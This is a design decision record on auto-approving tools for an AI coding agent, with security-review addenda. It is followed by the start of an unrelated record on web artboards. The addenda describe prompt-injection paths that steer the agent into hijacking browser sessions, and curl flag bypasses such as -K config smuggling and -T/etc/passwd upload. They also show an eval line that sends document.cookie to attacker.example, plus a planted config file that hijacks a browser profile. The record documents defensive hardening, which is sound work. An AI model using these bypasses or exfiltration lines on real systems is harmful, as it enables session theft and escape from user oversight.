decision.title: DDR-185-acp-agent-browser-curl-local-websearch-and-readonly-fs-allowlist.md
decision.rationale:
# DDR-185 — ACP default-allow: `agent-browser` + `curl-local` verb + read-only fs + WebSearch/WebFetch

**Status:** accepted · **Date:** 2026-07-18 · **Phase:** feature-acp-safe-defaults-and-attention-notifications
**Relates:** [DDR-184](DDR-184-acp-default-tool-allowlist-and-no-edit-mode-banner.md) (the default tool allow-list this extends — this DDR is a COMPLEMENT, using different mechanisms per capability class, not a reversal), [DDR-179](DDR-179-acp-permission-gate-retires-ddr125-f2.md) (mode-driven permission gate, unchanged), [DDR-180](DDR-180-acp-elicitation-form-support-askuserquestion-plus-mcp.md) (elicitation channel, unchanged), [DDR-054](DDR-054-linked-mode-trust-model-and-task-4-hardening.md) (untrusted-project-content trust model), [DDR-144](DDR-144-bundled-screenshot-engine-agent-browser-headless-shell.md) (`settingSources` narrowing, via its security addendum), [DDR-062](DDR-062-plugins-reach-executable-logic-via-maude.md) (`maude design <verb>` dispatch — the single-Bash-rule enabler)

## Context

A user reported that real `/design:setup-ds`/`/design:edit`/`/design:new` sessions in the ACP chat panel kept stalling on permission prompts, well beyond what DDR-184 already covers. Two concrete asks: (1) `curl` to the user's own localhost, and general read-only terminal commands, should not require approval every time; (2) later clarified — the actual dominant friction is that these design workflows call `agent-browser` and `WebSearch`/`WebFetch` directly and repeatedly, not just `curl`/`ls`.

DDR-184's own "Alternatives rejected" section explicitly killed "`acceptEdits` + a broad Bash allow-list of common commands" as unmaintainable — the literal shape of the initial ask. Extending the allow-list needed a mechanism that didn't reopen that risk.

**A `PreToolUse` hook was investigated as the "real enforcement" alternative to string-prefix matching, and ruled out.** Claude Code's `Bash(prefix:*)` allow-list syntax is a plain string-prefix match with no semantic understanding of "this argument is a URL to localhost" — `Bash(curl http://localhost:*)` does not match `curl -s http://localhost:3000` (the flag breaks the prefix). A `PreToolUse` hook could do a real host/path check instead, and the installed adapter (`@agentclientprotocol/claude-agent-acp@0.57.0/dist/acp-agent.js:2857`) does merge `...userProvidedOptions?.hooks` — but this path is a dead end: `apps/studio/acp/bridge.ts:719` spawns the adapter as a genuinely separate OS process (`Bun.spawn`), and `newSession(params)` (`bridge.ts:623`) sends `params` to that process over the ACP JSON-RPC wire. A `HookCallback` is a live JS function; it cannot survive JSON serialization across that process boundary. `userProvidedOptions.hooks` can only ever be populated by code running *inside* the adapter process — never by `bridge.ts`.

### Debate record

A 3-seat `reduce`-tier debate (BUILDER/SHIPPER/BREAKER, blind parallel openings, per `flow:debate-protocol`) ran on how to widen the allow-list for curl + fs without reopening DDR-184. Verdicts: BUILDER → `pretooluse-hook` (confidence 7), SHIPPER → `minimal-unscoped` (confidence 6 — a bare unscoped `Bash(curl:*)`, cutting the fs half entirely), BREAKER → `pretooluse-hook` reluctantly (confidence 8, with a "steelman against consensus" leaning toward shipping neither). No short-circuit — genuine disagreement, consolidated by the planning lead.

**The 2-of-3 `pretooluse-hook` verdict was overturned by a fact none of the three seats had**: the wire-boundary finding above. Preserved here rather than silently discarded: BUILDER/BREAKER's *reasoning* (real semantic enforcement beats string-prefix matching) is right, and is what the `curl-local` verb achieves via a different, wire-compatible mechanism; SHIPPER's caution about not reopening DDR-184's rejected shape is preserved in the fs list's "equivalent-power, closed-list, no-mutation" framing, and its "cut what isn't load-bearing" instinct is preserved by NOT giving `curl` a broad unscoped rule.

## Decision

Four independently-justified tracks — deliberately not collapsed into one "widen Bash" rule:

| Track | Mechanism | Why this one's safe to auto-approve |
| --- | --- | --- |
| `agent-browser` | Direct `Bash(agent-browser:*)` entry | Named, vetted, first-party-adjacent tool — same trust tier as `Bash(maude:*)`, not "any command" |
| `curl` | Dedicated `maude design curl-local` verb | Generic system utility reaching the network — Maude doesn't "own" curl the way it owns `agent-browser`/itself, so it earns real host enforcement instead of a blanket grant |
| `ls`/`cat`/`find`/`pwd`/`head`/`tail`/`wc`/`tree`/`file`/`stat` | Direct allowlist entries | Add no capability beyond what `Read`/`Grep`/`Glob` already grant unconditionally today — friction reduction, not a new grant |
| `WebSearch`/`WebFetch` | Direct allowlist entries (bare tool names, native) | Already-available native tools under the session's `claude_code` preset; risk is prompt-injection-via-fetched-content, orthogonal to the approve/deny decision itself |

**1. `Bash(agent-browser:*)`.** Confirmed by grep that `plugins/design/agents/motion-critic.md` and `plugins/design/commands/edit.md` (among others) document RAW `agent-browser eval`/`agent-browser screenshot` calls as current, expected behavior — not routed through any `maude design <verb>` wrapper, so DDR-184's `Bash(maude:*)` rule doesn't cover them. `agent-browser` is a declared dependency of the design plugin (`plugins/design/dependencies.json` — `"soft"`/auto-install for the general CLI/web install path, but **bundled unconditionally in the Maude desktop app**, which is the only place this allow-list applies since `design:chat` is native-only — so it is always present where this rule fires). Same trust argument DDR-184 already used for `Bash(maude:*)`: a named, vetted, purpose-built tool, not a generic shell escape hatch. **Residual, accepted explicitly:** nothing stops `agent-browser navigate https://not-localhost` — the tool has no built-in host restriction, and prefix-matching can't add one. This doesn't open a new risk category; it extends the one DDR-184 already accepted to a second tool. `npx playwright` (the documented fallback when `agent-browser` itself is missing) is deliberately excluded — `npx` executes arbitrary, non-pinned npm packages, a categorically bigger escape hatch than a fixed installed binary.

**2. `maude design curl-local <url> [curl-args...]`** (`apps/studio/bin/_curl-local.mjs` + `curl-local.sh`, dispatched via `cli/commands/design.mjs`'s `BIN_VERBS`). Resolves every http(s) target argument's host via `dns.lookup(host, {all:true, verbatim:true})` and requires **every** returned address to classify as strictly loopback (IPv4 `127.0.0.0/8`, IPv6 `::1` or its IPv4-mapped form) — closing the multi-record DNS-rebinding gap. Deliberately **stricter** than `_fetch-asset.mjs`'s `classifyAddress` (which blocks loopback/private/link-local/CGNAT/etc. and allows public IPs — built for fetching attacker-controlled external URLs): `curl-local` requires loopback specifically and rejects ordinary private-LAN addresses too (192.168.x.x is a different, real host — not "my own machine"). Reuses `_fetch-asset.mjs`'s reviewed `parseIPv4`/`parseIPv6` literal parsers rather than reinventing address parsing. Covered automatically by the **existing** `Bash(maude:*)` rule — zero additional Bash-surface widening. Unlike `fetch-asset`, does NOT DNS-pin the connection or disable redirects — the target is the user's own local dev server (not an attacker-controlled external URL), and that server issuing its own internal redirects is ordinary, expected behavior. A static line in `buildStudioBrief` (`apps/studio/acp/bootstrap-brief.ts`) nudges the model to prefer the verb; raw `curl` still falls through to today's normal permission prompt.

**3. Read-only filesystem verbs** (`Bash(ls:*)`, `Bash(cat:*)`, `Bash(pwd:*)`, `Bash(find:*)`, `Bash(head:*)`, `Bash(tail:*)`, `Bash(wc:*)`, `Bash(tree:*)`, `Bash(file:*)`, `Bash(stat:*)`). `Read`/`Grep`/`Glob` are already auto-approved with **no path scoping at all** (a pre-existing DDR-184 fact, not something this DDR changes) — Claude can already read any file it can name via those tools. So this list adds no incremental read capability; it's a more convenient interface to power already granted, not the "these commands are safe in isolation" argument DDR-184 already rejected. Mutating verbs (`mkdir`/`touch`/`rm`/`mv`/`cp`/`chmod`) are excluded — mutation stays behind `Write`/`Edit` (with `_history/` rollback) or the prompt. **Accepted residual, named not hidden:** `find`'s own flags can mutate (`-delete`/`-exec`), and prefix-matching can't distinguish `find . -name '*.tmp'` from `find . -delete` — drop `find` from the list first if this is ever judged unacceptable.

**4. `WebSearch`, `WebFetch`.** Bare native tool names — no `Bash(...)` prefix matching involved, so none of the flag-order brittleness above applies. Already part of the session's available toolset (the adapter defaults to the full `claude_code` tool preset), so this is purely a permission change, not a capability-availability change the way DDR-180's `AskUserQuestion` gate was. Removes friction from `/design:setup-ds` Stage-2 research (`ux-research-agent` runs 6-8 `WebSearch` queries) and `draw-agent`/`reconstruct-agent` reference lookups. **Residual, accepted explicitly:** fetched web content is exactly the kind of untrusted external data a prompt-injection attack rides in on — but this risk is orthogonal to the approve/deny decision (a user manually approving a WebFetch doesn't vet its content either) and exists in every Claude Code session regardless of Maude.

## Addendum — security fan-out findings, fixed before commit

The mandatory security-auditor + ethical-hacker fan-out (§Consequences below) ran against the Decision section above **before** it was ever released to users (same-session, before the closing commit) and found real, severe bypasses in two of the four tracks. Fixed, not waved through — this addendum is the current, accurate state; the Decision section above is left unedited as the historical record of what was first proposed.

**CRITICAL — `Bash(agent-browser:*)` was a zero-confirmation, zero-click session-hijack primitive (ethical-hacker Finding D).** The Decision section's residual note ("nothing stops `agent-browser navigate https://not-localhost`... extends the [DDR-184] risk to a second tool") materially understated the actual severity: `agent-browser`'s OWN bundled onboarding skill (`plugins/flow/skills/agent-browser/SKILL.md`, hidden, auto-loaded) recommends a **persistent** Chrome profile as its *default* auth strategy for exactly the high-value origins that make this dangerous — "your app (dev + prod), any service the user has personal SSO with… GitHub web… ClickUp / Linear / Notion." A DDR-054 prompt injection could steer the auto-approving session into `agent-browser navigate <authenticated-origin>` + `agent-browser eval "fetch(...)"`, reading or exfiltrating a real, live session with **no human anywhere in the chain** — worse than this repo's own prior worst-case bar (DDR-179's "wrong default silently grants a standing exemption," which at least required a misclick). The security-auditor's independent pass separately found the bare `Bash(agent-browser:*)` grant reached far more than "browser automation against the canvas" — `cookies get`, `clipboard read`, `--cdp`/`--auto-connect` (attach to any already-running debuggable Chrome), and the `chat` sub-agent were all reachable through the same one prefix rule.

**Fixed:** `Bash(agent-browser:*)` is REMOVED from `MAUDE_DEFAULT_ALLOWED_TOOLS`. The two real, documented raw call sites (`motion-critic.md`, `edit.md`) now go through a new hardened wrapper verb, `maude design agent-browser-safe` (`apps/studio/bin/_agent-browser-safe.mjs`), covered for free by the existing `Bash(maude:*)` rule:
- A closed subcommand allow-list (`open`/`eval`/`screenshot`/`snapshot`/`get`/`wait`/`close`) — nothing that reads cookies/clipboard/storage, attaches to an external Chrome, uploads/downloads files, or spawns `chat` is reachable at all.
- A closed reject-list for any argument that could override this wrapper's own constraints (`--profile`/`--session-name`/`--allowed-domains`/`--action-policy`/`--confirm-actions`/`--confirm-interactive`/`--cdp`/`--auto-connect`/`--proxy`/`--engine`) — fails closed on any of these, anywhere in argv.
- Forces `--allowed-domains localhost,127.0.0.1` — agent-browser's own NATIVE domain-scope enforcement, verified live (`agent-browser open https://example.com` through the wrapper is refused by agent-browser itself: `✗ Domain 'example.com' is not in the allowed domains list`).
- Explicitly **deletes** (not empty-strings — agent-browser validates an empty session name as invalid, not unset) any ambient `AGENT_BROWSER_PROFILE`/`AGENT_BROWSER_SESSION_NAME`/`AGENT_BROWSER_ACTION_POLICY`/`AGENT_BROWSER_CONFIRM_ACTIONS` before spawning, so a persistent profile configured in the user's own `~/.claude/settings.json` (which DDR-144's `settingSources:['user']` legitimately still reads for the user's own manual terminal use) cannot leak into this wrapper's calls.

**CRITICAL — `curl-local`'s "real host enforcement" claim had two independent, live-confirmed bypasses (security-auditor findings 1–2, ethical-hacker findings B–C).** The original implementation validated the hostname, then forwarded the caller's full argv verbatim to a real `curl` process:
1. **`-K`/`--config <file>`** — curl reads additional directives, including a different `url = "..."` target, from a config file; the argv scanner only recognized tokens that parse as URLs, so a validated loopback target plus `-K some.conf` let curl ALSO fetch whatever `some.conf` said (a file that could simply be checked into the served, DDR-054-untrusted project).
2. **`--resolve`/`--connect-to`** — force curl's actual TCP destination independent of the validated hostname, AND, even without an explicit override, Node's validation lookup and curl's own independent DNS resolution are two separate lookups with no pinning between them — the same TOCTOU bug class as CVE-2026-27826 (an MCP-server SSRF guard bypassed identically via DNS rebinding).

**Fixed:** `_curl-local.mjs` no longer forwards argv verbatim. It now allowlist-rejects (`validateArgv`) `-K`/`--config`/`--resolve`/`--connect-to`/`--next`/`-L`/`--location`/`--location-trusted`/`--max-redirs`/`-x`/`--proxy`/`--proxy-user`/`--socks4`/`--socks4a`/`--socks5`/`--socks5-hostname`/`-T`/`--upload-file` outright (a blocklist of KNOWN bypasses is exactly how the first cut missed these — the point is these are now REJECTED, not silently allowed-by-omission of a check), and PINS the connection itself via curl's own `--resolve host:port:IP`, set to the address `resolveLoopbackIp` already validated (mirrors `_fetch-asset.mjs`'s `curlDownload` pinning, opposite trust direction) — closing the TOCTOU regardless of DNS TTL. Also forces `-q` (no `.curlrc` auto-load — closes a related persistence angle the security-auditor flagged), `--proto '=http,https'`/`--proto-redir '=http,https'`, `--max-redirs 0`, and `--noproxy '*'`.

**MEDIUM — `Bash(find:*)`'s residual was mischaracterized (both reviewers, independently).** The Decision section named `find`'s risk as "own flags can mutate (`-delete`/`-exec`)" — comparable in the text's own framing to `mkdir`/`rm`. Both reviewers found this understated the actual severity: `find … -exec <any command> {} \;`/`-execdir`/`-ok` is **unrestricted arbitrary command execution with attacker-chosen argv**, not "mutation" — reopening exactly the blanket-Bash risk DDR-184 was built to prevent, through one closed-looking prefix rule. The ethical-hacker pass separately found `find`'s metadata predicates (`-perm`, `-newer`, `-user`) enable full-filesystem reconnaissance (SUID/SGID enumeration, recent-activity fingerprinting) that `Read`/`Grep`/`Glob` cannot replicate — a capability gap the "equivalent power" argument for the rest of the fs list doesn't cover.

**Fixed:** `find` is REMOVED from the fs verb list — not patched, because neither residual is fixable via prefix-matching (it can't inspect `find`'s own flags). The Decision section's own text ("drop `find` from the list first if this residual is ever judged unacceptable") is exactly what happened.

**MEDIUM — `WebFetch`/`WebSearch`'s residual named only the response side, not the request side (ethical-hacker Finding E).** The original residual note covered "fetched content is untrusted." It didn't name that the OUTBOUND request itself is a pure exfiltration channel independent of any response — a URL with attacker-chosen query-string content leaks the instant the request fires, no jailbreak or response-parsing needed. **Not fixed as a mechanism change** (no tractable server-side way to distinguish a legitimate WebFetch from a beaconing one without breaking the feature) — named explicitly here instead, per the reviewer's own recommendation, so it's an acknowledged residual rather than an omission that reads as "not considered."

**LOW — attention-notification burst (ethical-hacker Finding G).** DDR-179/180 cap pending requests at 10 permissions + 5 elicitations, so a single adversarial turn can legitimately queue up to 15 distinct approval decisions — this feature's own notification fires on every new one. **Fixed:** `app.jsx`'s `handleAssistantAttention` now rate-limits the OS `Notification` itself to at most one per 30s (`ATTENTION_NOTIFY_COOLDOWN_MS`); the in-app badge is unaffected (still reflects every new request instantly) — a burst now reads as one attention-getting ping, not fifteen.

**Verified clean (no finding):** the notification body is a static, generic string with no tool-call content, file path, or request payload interpolated — no information-disclosure path from the attention-notification feature itself. The `2d124965`-landed `handleAssistantAttention`/prop-wiring slice (see the commit-history note below) was reviewed and found clean independent of the rate-limit fix.

**Named, deliberately NOT changed:** `curl-local`'s scope is "any loopback address," not "only Maude's own dev-server port" (ethical-hacker Finding A) — the user's explicit ask was checking arbitrary local dev servers, not just Maude's own, so narrowing the scope would defeat the feature. Accepted and now named explicitly in `_curl-local.mjs`'s own header comment and in the Decision section context above, rather than left implicit.

New test coverage: `apps/studio/bin/_curl-local.test.mjs` (argv-allowlist rejection tests for every entry in `REJECTED_FLAGS`, including the exact `-K`/`--resolve` PoCs from both reports) and `apps/studio/bin/_agent-browser-safe.test.mjs` (subcommand-allowlist + flag-reject tests, including the exact `--profile`/`--cdp` PoCs). `apps/studio/test/acp-session-allowed-tools.test.ts` now also asserts NO raw `agent-browser` invocation remains in `motion-critic.md`/`edit.md`.

## Addendum, round 2 — the round-1 fixes were themselves bypassed; both wrappers redesigned

A mandatory re-verification pass (requested at `/flow:done`, since this DDR's status can't be treated as final without it) found that round 1's fixes for `curl-local` and `agent-browser-safe` were **live-reproducibly bypassable** — not theoretical gaps, actual working exploits against the shipped code. This is the second time this DDR's own security posture was found materially weaker than its text claimed; both findings and the root-cause pattern are recorded here in full rather than quietly patched, because the pattern itself is the lesson.

**CRITICAL — `curl-local`'s round-1 argv allowlist (`validateArgv`, `a.split('=')[0]`) never recognized curl's own CONCATENATED short-flag syntax.** curl accepts `-K<path>` (no space, no `=`) as equivalent to `-K <path>` — a real, common, fully-supported curl idiom. `validateArgv`'s check only stripped a `=`-joined suffix, so `-Kevil.conf`, `-xhttp://evil.example` (short form of the rejected `--proxy`), and `-T/etc/passwd` (short form of the rejected `--upload-file`) all sailed through unrejected. **Live-reproduced**: `node _curl-local.mjs "http://127.0.0.1:PORT/" "-K$PWD/evil2.conf"` fetched both the validated loopback target AND the config-smuggled second target — the EXACT original bypass this DDR's first addendum claimed was closed, reproduced verbatim against the "fixed" code.

**CRITICAL — a separate, independent gap in the same round-1 pass: `--noproxy` (the flag `curl-local` forces to `*`) was never itself added to `REJECTED_FLAGS`.** curl is last-flag-wins for repeated options, so a caller-supplied `--noproxy ""` placed after the wrapper's own forced `--noproxy '*'` silently re-enabled an ambient proxy. **Live-reproduced**: with `HTTP_PROXY` pointed at a fake local proxy, `node _curl-local.mjs http://127.0.0.1:PORT/ --noproxy ""` routed the "loopback-only" request through the fake proxy instead of connecting directly.

**HIGH — the round-1 `_agent-browser-safe.mjs` env-clearing list was a strict subset of what agent-browser's own `--help` documents.** `AGENT_BROWSER_AUTO_CONNECT` (env equivalent of the already-rejected `--auto-connect`), `AGENT_BROWSER_PROXY`/`HTTP_PROXY`/`HTTPS_PROXY`/`ALL_PROXY` (env equivalents of the already-rejected `--proxy`), and `AGENT_BROWSER_ENGINE` (env equivalent of the already-rejected `--engine`) were never cleared. **Live-reproduced**: a stub `agent-browser` confirmed all three leaked through unmodified from the ambient environment while `AGENT_BROWSER_PROFILE` was correctly cleared — an ordinary corporate/VPN `HTTP_PROXY`, or any prior terminal use that set `AGENT_BROWSER_AUTO_CONNECT`, defeated the wrapper with zero attacker action needed.

**Separately found (same review pass, before round-2 fixes were designed): `-p`/`--provider <name>`** — undocumented in the round-1 flag reject-list at all — routes an ENTIRE agent-browser session through a remote cloud browser provider (`browserbase`/`kernel`/`browserless`/`agentcore`) instead of local Chrome, a capability class round 1 never considered.

### Root cause, named plainly

Both round-1 wrappers used the same shape: allowlist the entry point (subcommand / target host), then REJECTLIST specific known-dangerous arguments in the remainder, forwarding everything else verbatim to the real binary. A rejectlist against a THIRD-PARTY CLI's own evolving argument grammar — short flags, concatenation, bundling, `=`-forms, env-var equivalents, provider/plugin flags — is an unbounded surface. Each fix closed the specific bypass found and left the next binary quirk for the next review pass to discover. This is not a "try harder to enumerate" problem; it is a wrong-shape-of-fix problem.

### Fixed: both wrappers redesigned to eliminate the bypass CLASS, not enumerate instances

- **`_curl-local.mjs`** no longer accepts raw curl arguments at all. It now defines and parses its OWN small, Maude-owned flag vocabulary (`parseRequestArgv`: `<url> [--method M] [--header "K: V"]... [--data D] [--user-agent UA] [--max-time N] [--output PATH] [--insecure] [--include] [--verbose]`) — plain, unambiguous `--flag value` pairs with no short forms, no concatenation, no bundling, nothing left to mis-parse — then constructs the real curl invocation (`buildCurlArgs`) from FIXED, hardcoded flag names, with every caller-supplied value riding as its own `spawnSync` argv array element (never string-interpolated, so a value containing e.g. `-K` or shell metacharacters is inert data to curl, not a new flag token). The caller can no longer NAME a curl flag at all, so there is no longer an enumeration to keep pace with. Uses `--data-raw` (never `-d`/`--data`, which treats a leading `@` as a local-file-read instruction) — live-verified: a `--data "@/etc/passwd"` value round-trips as the literal 13-character string, not file contents.
- **`_agent-browser-safe.mjs`** replaces its flag reject-list with a fixed positional-argument ARITY per subcommand (`open`=1, `eval`=1, `screenshot`=0-1, `snapshot`=0, `get`=1-2, `wait`=1, `close`=0) and rejects ANY argv beyond that count — flag-shaped or not. `-p browserbase`, `--provider browserbase`, `--profile Default`, `--cdp 9222` are all rejected the same way now: as unexpected extra arguments, not as individually-named forbidden flags. A legitimate `eval` expression starting with `-` (e.g. `"-1 + 2"`) still works — arity is a COUNT check, never a prefix check, so it can't confuse a positional value's own content with a flag. `CLEARED_ENV_KEYS` grew from 5 to 14 entries (adds the 3 newly-found equivalents plus both cases of all 4 standard proxy vars).

Both fixes live-verified end to end against the real `curl`/`agent-browser` binaries on this machine (not just unit tests): the exact `-K`/`--noproxy`/`-p` PoCs from this addendum now fail with a clear "not recognized" error before either real binary is ever invoked; the legitimate documented workflows (a loopback GET/POST, `eval`/`screenshot`/`open` with no extra arguments) still function identically to before.

**Revisit-when addition:** if either wrapper's flag-free/arity-only model is ever felt too restrictive for a genuine new need (e.g. `agent-browser-safe snapshot -i` for the interactive-elements-only filter), add it as an explicit, narrowly-scoped, reviewed extension to that subcommand's arity/shape — never by reopening a "reject known-bad, allow everything else" flag model on either file again.

## Addendum, round 3 — the round-2 redesign closed the argv-parsing bugs, but never verified the wrapped binary's OWN behavior; two further live bypasses found and fixed

A THIRD verification pass (adversarial, requested again before this DDR could be treated as settled) found round 2's redesign — while structurally correct for the argv-parsing bug class it targeted — never checked whether the underlying binary's OWN features (its network model, its config-file resolver) actually honored the restrictions the wrappers claimed to force. Two real, live-confirmed findings, both against `_agent-browser-safe.mjs` only (`_curl-local.mjs`'s round-2 rewrite was independently re-verified clean, including against a THIRD bypass this same pass found — see below):

**CRITICAL — `eval` defeats `--allowed-domains` entirely, because a navigation gate is not a network-egress firewall.** `--allowed-domains` restricts `agent-browser open <url>` (top-level navigation) only — it installs no in-page network policy. `eval` runs arbitrary JS in whatever page is already loaded, with none of that restriction. **Live-confirmed** two independent ways: (1) `eval "window.location.href='https://example.com/'"` simply navigates around the domain gate — a follow-up `get url` showed the escaped origin; (2) even without navigating, `eval "fetch('https://attacker.example/c?d='+document.cookie,{mode:'no-cors'})"` beacons out directly — a no-cors fetch's `status:0`/`type:'opaque'` response confirms the request actually left the machine, no read-back needed to exfiltrate. There is no argv-level fix: `eval` **is** arbitrary JS execution in page context, and network/navigation reach is inherent to that capability, not a separable flag to strip. **Fixed** by removing `eval` from `ALLOWED_SUBCOMMANDS` entirely — mirrors this DDR's own `find` precedent verbatim ("neither residual is fixable via prefix-matching... cut it, don't patch it"). The two real call sites that used it (`motion-critic.md:107-108`, `edit.md:51`) revert to raw `agent-browser eval`, which still prompts for confirmation — the pre-DDR-185 status quo for those two specific calls, not a new regression. `screenshot`/`open`/etc. at the same call sites stay on the hardened wrapper, unaffected.

**CRITICAL — `./agent-browser.json` project-level config auto-discovery bypassed every CLI-flag and env-var protection built in rounds 1 and 2, needing zero flags or env vars at all.** agent-browser's own `--help` documents a 4-tier config precedence: `~/.agent-browser/config.json` (user-level) → **`./agent-browser.json`, discovered from CWD** (project-level) → env vars → CLI flags. The ACP session's `cwd` is `repoRoot` — DDR-054 UNTRUSTED project content. **Live-confirmed**: a plain `agent-browser.json` (`{"profile":"./hijacked-profile"}`) placed at a scratch repo root was auto-discovered and honored on the very next `agent-browser-safe` call — no model complicity needed, the file alone does the work; `agent-browser profiles` on the reviewing machine listed 4 real, logged-in Chrome profiles this could have targeted. This is a confused-deputy vector neither prior round considered — both modeled the attack surface as "CLI flags and env vars," never "a file the untrusted project itself can drop." **Fixed**: `--config <path>` is documented to REPLACE the entire default discovery chain (both tiers) with the one file named — every `agent-browser-safe` spawn now forces `--config` at a fixed, Maude-owned, always-valid-empty-JSON file (`_agent-browser-safe-config.json`, `{}`), so `./agent-browser.json` is never read regardless of what's on disk. `AGENT_BROWSER_CONFIG` also added to `CLEARED_ENV_KEYS` (defense in depth against an ambient override of the config path itself). Live-reproduced the exact PoC against the fixed code: the malicious `agent-browser.json` is present in the scratch cwd but never acted on (no hijacked-profile directory created).

**Also found, already closed as a side effect of the round-2 rewrite (not a new fix needed):** `curl-local`'s round-1 code (superseded before this pass ran) was separately shown live-bypassable via `--unix-socket` (retargets the *transport*, not the *host* — sidesteps hostname/DNS validation entirely; against a real Docker socket this is a root-equivalent RCE primitive, not just an SSRF). Confirmed this does NOT apply to the round-2 Maude-owned-vocabulary rewrite: `--unix-socket` isn't in `parseRequestArgv`'s recognized flag set, so it hits the same "unrecognized flag" rejection as every other unlisted curl flag — closed by construction, the same way the redesign closes every OTHER not-yet-discovered curl flag.

**Noted, not changed:** `curl-local`'s `--output <path>` (round-2 addition) writes an HTTP response body to a caller-chosen local path — flagged as worth scrutiny but explicitly not a blocker by the reviewing pass. Accepted on the same "equivalent power" reasoning as the read-only fs verbs: `Write` is already unconditionally auto-approved with no path scoping (an existing DDR-184 fact), and the same effect (read a loopback response, write it anywhere) is already composable today via `curl-local` (stdout) + `Write` in two approved steps — `--output` collapses that into one call without adding a capability that wasn't already reachable.

**Root cause, sharpened from round 2's framing:** round 2 correctly diagnosed "don't enumerate a third-party CLI's flag grammar" and fixed that bug class. This pass shows the lesson is one level broader: even a wrapper that no longer parses the WRAPPED BINARY's flags at all must still verify, empirically, that the binary's other configuration surfaces (config files, precedence rules, capability boundaries like "a navigation gate isn't a network gate") actually behave the way the wrapper's own comments claim. Argv-parsing correctness and runtime-behavior correctness are two different properties; this repo's test suites for both wrappers, before this round, only ever verified the former. New tests in `_agent-browser-safe.test.mjs` load-bear the `_agent-browser-safe-config.json` file's own existence/validity for exactly this reason.

**Standing rule added for future `maude design <verb>` wrappers around a third-party CLI** (recorded here since no better single home exists yet): validate against the wrapped binary's ENTIRE `--help`/config-precedence documentation before considering a wrapper complete, and prefer at least one test that spawns the REAL binary and asserts the claimed restriction actually held — not only unit tests against the wrapper's own argv-parsing functions.

## Consequences

- The dominant real-world friction in `/design:setup-ds`/`/design:edit`/`/design:new` ACP sessions — `agent-browser` calls (now via the hardened wrapper), `WebSearch`/`WebFetch` research, basic fs inspection, and localhost `curl` (now via the hardened wrapper) — runs without a prompt, while arbitrary Bash, non-loopback targets, and unlisted commands still route through the real approve/deny gate (DDR-179).
- `apps/studio/test/acp-session-allowed-tools.test.ts`'s source-of-truth guard now asserts the Bash rules are EXACTLY `Bash(maude:*)` + the closed fs list (no `agent-browser`, no `find`) — nothing else — and that `WebSearch`/`WebFetch` are present. A future widening beyond this fixed set fails loudly.
- **Mandatory security-auditor + ethical-hacker fan-out**, matching every prior ACP-permission DDR (179, 180, 184) — ran this session, found the findings documented in the addendum above, all fixed before this DDR's status was finalized.

## Alternatives rejected

- **Curated `curl` prefix-list** (`Bash(curl http://localhost:*)` etc.) — the literal DDR-184-rejected shape; flag-order and `127.0.0.1`-vs-`localhost` text variants defeat it outright.
- **`PreToolUse` hook via `_meta.claudeCode.options.hooks`** — structurally infeasible; see the wire-boundary finding above. Do not attempt this without first re-verifying the adapter's process topology hasn't changed (spawn vs. in-process import) on any future `@agentclientprotocol/*` version bump.
- **Bare unscoped `Bash(curl:*)`** (SHIPPER's literal ask) — rejected because the `curl-local` verb achieves the same friction removal with real enforcement at roughly the same implementation cost; kept as the documented fallback if the verb approach ever proves materially harder to maintain than expected.
- **Provisioning a hook into the user's own `~/.claude/settings.json`** — rejected: would leak Maude's gate into the user's unrelated plain-terminal `claude` sessions (global, not session-scoped), and conflicts with the spirit of `settingSources:['user']` narrowing being about *reading* user config, not Maude *writing* into it.
- **Routing `agent-browser` through new `maude design <verb>` wrappers instead of a direct Bash rule** — INITIALLY rejected for this pass on the reasoning that some call sites (`edit.md`'s `agent-browser eval "matchMedia(...)"`) are ad-hoc, dynamic expressions that don't fit a fixed verb. **Reversed by the security addendum above**: the dynamic-expression concern is real but doesn't require a FIXED verb per expression — `agent-browser-safe eval "<any expression>"` still accepts an arbitrary `eval` argument, it's the SUBCOMMAND set and the override-capable flags that are closed, not the expression content. The original rejection conflated "the eval argument varies" with "the wrapper can't work," which doesn't follow.

## Revisit when

- The adapter/SDK changes how `hooks`/`allowedTools` are forwarded, or `Bash(prefix:*)` matcher semantics change (mirrors DDR-184's own revisit clause).
- `agent-browser` ships its own equivalent of `--allowed-domains`/profile controls that make `_agent-browser-safe.mjs`'s reject-list redundant, or changes its CLI surface in a way that adds a NEW subcommand/flag capable of reading credentials/attaching to another process — re-audit `ALLOWED_SUBCOMMANDS`/`REJECTED_FLAGS` against the new `--help` output on any agent-browser version bump.
- `curl-local`'s "any loopback address" scope (accepted, named explicitly above) is judged too broad for a future multi-user/hub-reachable ACP surface (mirrors DDR-125's "untrusted to peers" line) — at that point, scoping to an explicit port allowlist (config-driven, not hardcoded to Maude's own port) is the likely next step.
- The `curl-local`/`agent-browser-safe` reject-lists are blocklists of KNOWN bypasses, not a formal proof of completeness — if either tool's CLI gains a new flag with similar override power to what's already rejected, it needs adding here too. Re-read this DDR's addendum before assuming either wrapper's reject-list is exhaustive.

## Linked

- Plan: `.ai/plans/feature-acp-safe-defaults-and-attention-notifications.md`
- Extends: DDR-184 (three of four tracks are net-new mechanisms, not a widening of DDR-184's own `Bash(maude:*)` rule)

decision.rationale:
# DDR-186: Web artboards — flex-first contract, breakpoint duplicate (copy not variant), grid track editor on the existing edit-css lane

**Status:** Accepted
**Date:** 2026-07-18
**Tags:** canvas-lib, artboard, web, grid, breakpoints, ux

## Context

`feature-1-artboard-kinds-foundation` (DDR-181) added `kind="web"` to the `ArtboardKind` union and the overlay-registry mount point, but left the kind's actual behavior as a placeholder: no authoring contract, no breakpoint vocabulary, no way to test reflow, and no on-canvas grid editing (the `feature-grid-track-editor.md` stub, split off Stage M of `feature-element-editing-robustness`, was parked pending this plan). `feature-3-web-artboards` is the third of the kind-family plans (after DDR-181 foundation, DDR-182 print) and absorbs that stub as its own T5.

Four questions needed answers before implementation: (1) what does "flow-first" mean operationally for generation + editing, given the codebase already bans `vw`/`vh`/`@media` inside an artboard for isolation reasons; (2) does testing another breakpoint create a new artboard or a linked/synced variant of one; (3) does a CSS-Grid track editor need new server-side write infrastructure, or does the existing single-property `/_api/edit-css` lane already suffice; (4) how does a gutter-drag resolve a `fr`/`%` track's new size when those units have no fixed px meaning until the browser lays the grid out.

## Alternatives considered

**Flow-first enforcement:**
- **A structural lint that rejects absolute positioning inside a `kind="web"` artboard outright** — pros: hard guarantee; cons: overlays (badges, floating CTAs) are legitimate absolute-positioned content in real web pages, and a hard block would just push authors to non-obvious CSS to route around it. Rejected.
